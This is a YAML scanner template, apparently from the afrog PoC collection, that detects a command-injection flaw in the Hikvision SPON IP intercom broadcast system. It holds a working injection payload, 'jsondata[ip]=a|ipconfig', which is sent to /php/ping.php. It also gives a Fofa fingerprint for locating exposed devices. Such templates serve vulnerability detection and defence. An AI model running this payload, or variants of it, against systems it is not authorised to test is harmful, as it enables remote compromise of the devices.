# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: jsondata[ip]=a|ipconfig&jsondata[type]=1
    matchers:
      - type: word
        part: body
        words:
          - Windows IP
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/php/ping.php'
id: spon-ip-intercom-ping-rce
info:
  author: york
  description: |-
    海康威视存在RCE漏洞，该漏洞源于文件/php/ping.php的参数jsondata[ip]会导致操作系统命令注入，执行任意命令，通过该漏洞可以获取服务器权限。
    Fofa: icon_hash="-1830859634"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Hikvision SPON IP网络对讲广播系统存在命令执行漏洞
  severity: critical
  tags: cve,cve2023,hikvision,rce,argus-import
